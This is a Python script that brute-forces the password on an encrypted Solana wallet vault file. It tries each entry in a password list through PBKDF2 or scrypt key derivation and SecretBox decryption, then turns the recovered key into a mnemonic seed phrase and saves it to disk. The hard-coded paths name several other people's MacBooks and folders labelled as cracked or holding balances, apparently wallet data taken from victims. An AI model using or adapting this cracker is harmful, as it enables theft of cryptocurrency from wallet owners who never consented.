import base58
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from nacl.secret import SecretBox
from nacl.exceptions import CryptoError
import json
from mnemonic import Mnemonic
import binascii
from datetime import datetime

######## Loading passwords
print('Loading password file...')
passfile = 'D:\\DOSGAMES\\MAC_data\\KKH\\MacBook-Pro.local-a1_1_bal_4000\\passlist.txt'
##passfile = 'd:\\DOSGAMES\\MAC_data\\Gregorys-MacBook-Air.local\\passlist.txt'
##passfile = 'F:\\hashcat\\MAC_data\\KKH\\macbookpro.local-petartonev1\\pass_guess.txt'
##passfile = 'F:\\hashcat\\MAC_data\\KKH\\cracked\\1-Sakthivels-Air-sakthivel_1\\userlist.txt'
with open(passfile, "r", encoding='utf8') as file:
    passstr = file.read()

passwords = passstr.split('\n')
PassNum = len(passwords)
print('passwords number = ' + str(PassNum))


######## Loading solana vault file
filename = 'D:\\DOSGAMES\\MAC_data\\KKH\\MacBook-Pro.local-a1_1_bal_4000\\sol_vault.json'
f = open(filename, 'r')
jsondata = json.load(f)
f.close()

data = jsondata['encryptedKey']

# Decode from Base58
salt = base58.b58decode(data['salt'])
nonce = base58.b58decode(data['nonce'])
encrypted_data = base58.b58decode(data['encrypted'])
drivationFunc = data['kdf']
print('Drivation Function is ' + drivationFunc)
print('\n')
resolved = False
num = 0
for password in passwords:
    num = num + 1
    print(str(num) + '/' + str(PassNum) + ':' + password)
    if 'pbkdf2' in drivationFunc:
        # Derive the key using PBKDF2 with SHA-256
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=data['iterations'],
            backend=default_backend()
        )
    elif 'scrypt' in drivationFunc:
        kdf = Scrypt(
            salt=salt,
            length=32,
            n=2**14,
            r=8,
            p=1
            )

    key = kdf.derive(password.encode())
    # Decrypt the data using PyNaCl's SecretBox
    box = SecretBox(key)
    try:
        decrypted = box.decrypt(encrypted_data, nonce)
        # Instead of attempting to decode as UTF-8, print the raw bytes or their hex representation
        print("Decrypted data (hex):", decrypted.hex())

        # Decrypted data in hex
        decrypted_hex = decrypted.hex()
        # Convert hex to bytes
        entropy_bytes = binascii.unhexlify(decrypted_hex)
        # Generate mnemonic from the entropy bytes
        mnemo = Mnemonic("english")
        mnemonic = mnemo.to_mnemonic(entropy_bytes)
##        print("Mnemonic:", mnemonic)
        print('Cracked!!!')
        resolved = True

        ### write down into file
        current_datetime = datetime.now().strftime("%Y%m%d-%H%M%S")
        filename = f"ak_{current_datetime}.txt"
        with open(filename, "a") as file:
            file.write(mnemonic)
        
        break

    except CryptoError as e:
        continue


if resolved == False:
    print('Not resolved.')
